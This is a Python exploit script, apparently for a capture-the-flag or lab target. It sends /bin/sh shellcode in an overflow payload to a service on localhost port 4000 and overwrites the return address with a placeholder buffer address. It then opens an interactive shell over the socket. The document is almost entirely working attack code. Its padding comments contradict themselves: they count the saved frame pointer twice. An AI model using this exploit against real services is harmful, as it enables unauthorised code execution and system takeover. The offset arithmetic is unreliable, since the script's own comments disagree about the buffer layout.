#!/usr/bin/env python3
import socket
import struct
import time

# Shellcode: execve("/bin/sh", NULL, NULL)
# This is a standard x86 Linux shellcode
shellcode = (
    b"\x31\xc0"              # xor eax,eax
    b"\x50"                  # push eax
    b"\x68\x2f\x2f\x73\x68"  # push 0x68732f2f
    b"\x68\x2f\x62\x69\x6e"  # push 0x6e69622f
    b"\x89\xe3"              # mov ebx,esp
    b"\x50"                  # push eax
    b"\x53"                  # push ebx
    b"\x89\xe1"              # mov ecx,esp
    b"\xb0\x0b"              # mov al,0xb
    b"\xcd\x80"              # int 0x80
)

def exploit():
    # Connect to the service
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 4000))
    
    # Receive the banner
    banner = s.recv(1024)
    print("Received banner")
    
    # Wait for "What is your name?" prompt
    prompt = s.recv(1024)
    print(f"Prompt: {prompt}")
    
    # Calculate buffer address (you may need to adjust this)
    # The buffer is at a fixed location in the binary's data section
    # We can find this with gdb or by testing
    buffer_addr = 0x804c000  # This is an example - you'll need the actual address
    
    # Build the payload
    payload = b""
    
    # Stage 1: Place shellcode at the beginning of our input
    payload += shellcode
    
    # Pad with NOPs to reach the return address
    # We need 300 bytes to fill local_buf + 4 bytes for saved ebp = 304 bytes
    payload += b"\x90" * (304 - len(payload))  # NOP sled
    
    # Overwrite saved EBP (4 bytes)
    payload += b"BBBB"
    
    # Overwrite return address - jump to our shellcode in the global buffer
    payload += struct.pack("<I", buffer_addr)
    
    # Send the payload
    print(f"Sending {len(payload)} bytes...")
    s.send(payload)
    
    # The shellcode should now be executing
    # Try to interact with the shell
    time.sleep(0.5)
    
    # Send commands to the shell
    try:
        s.send(b"id\n")
        response = s.recv(1024)
        print(f"Response: {response}")
        
        # If we get a shell, we can send more commands
        s.send(b"whoami\n")
        response = s.recv(1024)
        print(f"Response: {response}")
        
        # Keep the shell open
        print("Shell opened successfully! Type commands:")
        while True:
            cmd = input("$ ") + "\n"
            s.send(cmd.encode())
            response = s.recv(4096)
            print(response.decode(), end='')
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    exploit()